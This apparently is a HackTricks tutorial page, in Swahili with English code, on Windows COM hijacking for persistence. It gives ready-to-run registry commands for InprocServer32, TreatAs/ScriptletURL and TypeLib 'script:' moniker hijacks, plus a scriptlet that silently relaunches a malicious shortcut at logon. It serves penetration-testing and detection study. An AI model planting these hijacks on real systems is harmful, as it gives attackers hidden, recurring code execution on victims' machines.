# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Kutafuta komponenti za COM ambazo hazipo

Kwa kuwa thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **persistence mechanism**. Kwa kutumia `procmon` ni rahisi kupata rejista za COM zinazotafutwa ambazo hazipo bado na zinaweza kuundwa na mshambuliaji. Vichujio vya kawaida:

- **RegOpenKey** operesheni.
- ambapo _Result_ ni **NAME NOT FOUND**.
- na _Path_ inaishia na **InprocServer32**.

Mabadiliko muhimu wakati wa uwindaji:

- Pia angalia funguo za **`LocalServer32`** ambazo zinakosekana. Baadhi ya darasa za COM ni out-of-process servers na zitaleta EXE inayodhibitiwa na mshambuliaji badala ya DLL.
- Tafuta **`TreatAs`** na **`ScriptletURL`** operesheni za rejista pamoja na `InprocServer32`. Maudhui ya utambuzi ya hivi karibuni na maelezo ya malware yanaendelea kuyataja haya kwa sababu ni nadra zaidi kuliko usajili wa kawaida wa COM na kwa hiyo yana thamani kubwa ya ishara.
- Nakili **`ThreadingModel`** halali kutoka asili `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` wakati wa kuiga usajili hadi HKCU. Kutumia modeli isiyo sahihi mara nyingi huvunja uanzishaji na kufanya hijack ionekane.
- Kwenye mifumo ya 64-bit chunguza maoni ya 64-bit na 32-bit (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` na `HKLM\Software\Classes\WOW6432Node`) kwa sababu programu za 32-bit zinaweza kutatua usajili tofauti wa COM.

Mara utakapoweka uamuzi ni COM gani isiyokuwepo kuiga, tekeleza amri zifuatazo. _Tahadhari: ikiwa utaamua kuiga COM inayopakiwa kila sekunde chache, inaweza kuwa kupitiliza._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Vipengele vya COM vya Task Scheduler vinavyoweza kuingiliwa

Windows Tasks hutumia Custom Triggers kuita COM objects, na kwa sababu zinaendeshwa kupitia Task Scheduler, ni rahisi kutabiri lini zitakapochochewa.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ukichunguza matokeo unaweza kuchagua moja itakayotekelezwa **kila wakati mtumiaji anapoingia** kwa mfano.

Sasa ukitafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na katika HKLM na HKCU, kawaida utagundua kuwa thamani haipo ndani ya HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Kisha, unaweza kuunda ingizo la HKCU tu na kila wakati mtumiaji anapoingia, backdoor yako itaendeshwa.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` inaruhusu CLSID moja kuigwa na nyingine. Kwa mtazamo wa mashambulizi, hii inamaanisha unaweza kuacha CLSID ya asili bila kuibadilisha, kuunda CLSID ya pili kwa kila mtumiaji inayorejelea `scrobj.dll`, na kisha kuelekeza object halisi ya COM kwenda ile ya uharibifu kwa `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Hii ni muhimu wakati:

- programu lengwa tayari huanzisha CLSID thabiti wakati wa kuingia au kuanzishwa kwa app
- unataka redirect inayotumika tu katika registry badala ya kubadilisha `InprocServer32` ya asili
- unataka kutekeleza scriptlet ya ndani au ya mbali `.sct` kupitia thamani ya `ScriptletURL`

Mfano wa mtiririko wa kazi (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Vidokezo:

- `scrobj.dll` inasoma thamani ya `ScriptletURL` na inatekeleza `.sct` inayorejelewa, kwa hivyo unaweza kuiweka payload kama faili ya ndani au kuipeleka kwa mbali kupitia HTTP/HTTPS.
- `TreatAs` ni hasa handy wakati usajili wa awali wa COM umekamalika na thabiti katika HKLM, kwa sababu unahitaji tu redirect ndogo kwa kila mtumiaji badala ya kuiga mti mzima.
- Kwa uthibitisho bila kusubiri kichocheo asilia, unaweza kuanzisha ProgID/CLSID bandia kwa mkono kwa kutumia `rundll32.exe -sta <ProgID-or-CLSID>` ikiwa darasa lengwa linaunga mkono STA activation.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) define COM interfaces na zinapakiwa kupitia `LoadTypeLib()`. Wakati COM server inapoanzishwa, OS pia inaweza kupakia TypeLib inayohusiana kwa kuangalia funguo za rejista chini ya `HKCR\TypeLib\{LIBID}`. Ikiwa njia ya TypeLib inabadilishwa na **moniker**, kwa mfano `script:C:\...\evil.sct`, Windows itatekeleza scriptlet wakati TypeLib itakapotatuliwa – ikitoa stealthy persistence ambayo inachochea wakati vipengele vya kawaida vinapotumiwa.

Hii imeonekana dhidi ya Microsoft Web Browser control (inayopakiwa mara nyingi na Internet Explorer, apps zinazojumuisha WebBrowser, na hata `explorer.exe`).

### Hatua (PowerShell)

1) Tambua TypeLib (LIBID) inayotumika na CLSID inayotumika mara nyingi. Mfano wa CLSID ambao mara nyingi hutumiwa na mnyororo za malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Elekeza njia ya TypeLib ya kila mtumiaji kwa scriptlet ya ndani ukitumia lakabu `script:` (haitaji haki za admin):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Weka faili ndogo ya JScript `.sct` ambayo itaanzisha tena payload yako kuu (kwa mfano `.lnk` inayotumika na mnyororo wa awali):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Kusababisha – kufungua IE, programu inayojumuisha WebBrowser control, au hata shughuli za kawaida za Explorer itapakia TypeLib na itatekeleza scriptlet, kuwasha tena mnyororo wako wakati wa logon/reboot.

Usafishaji
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Vidokezo
- Unaweza kutumia mantiki ile ile kwa COM components nyingine zinazotumika mara nyingi; daima tatua `LIBID` halisi kutoka `HKCR\CLSID\{CLSID}\TypeLib` kwanza.
- Kwenye mifumo ya 64-bit unaweza pia kujaza subkey ya `win64` kwa watumiaji wa 64-bit.

## Marejeo

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
